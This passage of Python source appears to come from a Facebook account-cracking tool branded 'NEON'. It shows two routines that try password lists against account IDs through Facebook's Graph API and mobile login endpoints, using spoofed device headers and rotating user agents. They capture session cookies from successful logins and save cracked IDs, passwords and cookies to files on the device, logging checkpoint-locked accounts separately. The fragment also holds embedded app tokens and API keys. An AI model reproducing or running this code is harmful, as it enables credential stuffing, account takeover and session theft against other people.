            data = {"email":ids,"password":pas,"adid": str(uuid.uuid4()),"device_id": str(uuid.uuid4()),"family_device_id": str(uuid.uuid4()),"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"logged_out_id": str(uuid.uuid4()),"locale": "en_US","client_country_code": "US","cpl": "true","source": "login","format": "json","omit_response_on_success": "false","credentials_type": "password","error_detail_type": "button_with_disabled","generate_session_cookies": "1","generate_analytics_claim": "1","generate_machine_id": "1","tier": "regular",'account_verified': 'True',"currently_logged_in_userid" : "0","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3","fb4a_shared_phone_cpl_group": "enable_v3_at_risk","access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","api_key": "882a8490361da98702bf97a021ddc14d","sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head = {"User-Agent":NEONUA1(),"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Connection-Quality": "EXCELLENT","X-FB-Connection-Type": "MOBILE.LTE","X-FB-HTTP-Engine": "Liger",'X-FB-Client-IP': 'True',"X-FB-Friendly-Name": "authenticate","Content-Type": "application/x-www-form-urlencoded","Content-Length": str(len(content_lenght))}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                uid = str(po['uid'])
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                res=requests.get(ckk).text
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                if uid in str(oks):break
                else:
                    if "Photoshop" in res:
                        print(f"\r\r{X}-{A}[NEON-OK] • {uid} • {pas}")
                        if "y" in apk:
                            print(f"\r\r{X}-{W}[🍪] \x1b[38;5;47m{cookie}")
                            check_apk(cookie)
                        else:pass
                        open('/sdcard/NEON-RNDM-M1-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                    else:pass
            elif "Please Confirm Email" in po:
                uid = str(po['uid'])
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                res=requests.get(ckk).text
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                if uid in str(oks):break
                else:
                    if "Photoshop" in res:
                        print(f"\r\r{X}-{A}[NEON-NOV] • {uid} • {pas}")
                        if "y" in apk:
                            print(f"\r\r{X}-{W}[🍪] \x1b[38;5;47m{cookie}")
                            check_apk(cookie)
                        else:pass
                        open('/sdcard/NEON-RNDM-M1-NOVERY.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                    else:pass
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                print(f"\r\r{X}-{D}[NEON-CP] • {uid} • {pas}")
                open('/sdcard/NEON-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:pass
##--------------( NEON ZONE )-------------##
def randB(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}NEON-M2{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ua = random.choice(agent)
            xs = requests.get("https://m.facebook.com/login").text
            data = {
            "m_ts":int(time.time()),
            "li":re.search('name="li" value="(.*?)"', str(xs)).group(1),
            "try_number":0,
            "unrecognized_tries":0,
            "email":ids,
            "prefill_contact_point":"",
            "prefill_source":"",
            "prefill_type":"",
            "first_prefill_source":"",
            "first_prefill_type":"",
            "had_cp_prefilled":False,
            "had_password_prefilled":False,
            "is_smart_lock":False,
            "bi_xrwh":0,
            'encpass': "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pas),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(xs)).group(1),
            "lsd":re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
            "__dyn":"",
            "__csr":"",
            "__req":random.choice(["1","2","3","4","5","6","7","8","9","0"]),
            "__a":"",
            "__user":0
            }
            headers = {
            'Host': 'mbasic.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.7125',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'viewport-width': '421',
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream'}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xid = re.findall('c_user=(.*);xs', cookie)[0]
                uid = str(xid)
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                res=requests.get(ckk).text
                if uid in str(oks):break
                else:
                    if "Photoshop" in res:
                        print(f"\r\r{X}-{A}[NEON-OK] • {uid} • {pas}")
                        if "y" in apk:
                            print(f"\r\r{X}-{W}[🍪] \x1b[38;5;47m{cookie}")
                            check_apk(cookie)
                        else:pass
                        open('/sdcard/NEON-RNDM-M1-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                    else:pass
            elif "checkpoint" in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                if idf in str(cps):break
                else:
                    print(f"\r\r{X}-{D}[NEON-CP] • {idf} • {pas}")
                    open('/sdcard/NEON-RNDM-CP.txt','a').write(idf+'|'+pas+'\n')
                    cps.append(idf)
                    break
            else:continue
        loop+=1
    except Exception as e:print(e)  
##--------------( NEON ZONE )-------------##
if __name__ == "__main__":
    Main.Menu()